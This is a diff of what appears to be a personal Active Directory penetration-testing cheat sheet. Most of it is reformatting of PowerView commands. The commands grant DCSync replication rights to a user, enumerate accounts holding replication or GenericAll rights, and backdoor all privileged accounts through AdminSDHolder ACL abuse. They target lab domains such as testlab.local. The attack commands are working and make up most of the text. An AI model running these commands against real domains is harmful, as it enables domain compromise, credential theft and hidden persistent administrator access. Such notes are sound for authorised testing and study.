@@ -369,23 +369,22 @@ misc::skeleton
 ```Set-ADACL -DistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -Principal Mary -GUIDRight DCSync -Verbose``` - AD Module
 
 # Check ACLs
-NOT WORKING!! In Progress...
+In Progress...
+
 ```Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'Mary'}```
 
-try:
-```
-Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object { $_.IdentityReference -match 'Mary' }
-```
+```Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object { $_.IdentityReference -match 'Mary' }```
+
+**Note:**  ```Where-Object```  ==  ``` ? ```
 
 DCSync: 
 
 ```Get-DomainObjectAcl -DistinguishedName "dc=bcorp,dc=ecorp,dc=lab" -ResolveGUIDs | ? {($_.IdentityReference -match "Mary") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}```
 
-From PowerView notes:
-```Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')```
+# From PowerView notes:
+#### retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
+```Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}```
 
-Note:  ```Where-Object```  ==  ``` ? ```
-# Working from Powerview:
 #### enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names
 ```Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local```
 
@@ -398,7 +397,8 @@ Note:  ```Where-Object```  ==  ``` ? ```
 #### backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
 ```Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All```
 * * *
-#### Recurse through all ACEs for user/group
+#### Recurse through all ACEs for user/group:
+
 This appends the resolved user or group name to each ACE and recurses through:
 ```
 Get-DomainObjectAcl -Identity Josh -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
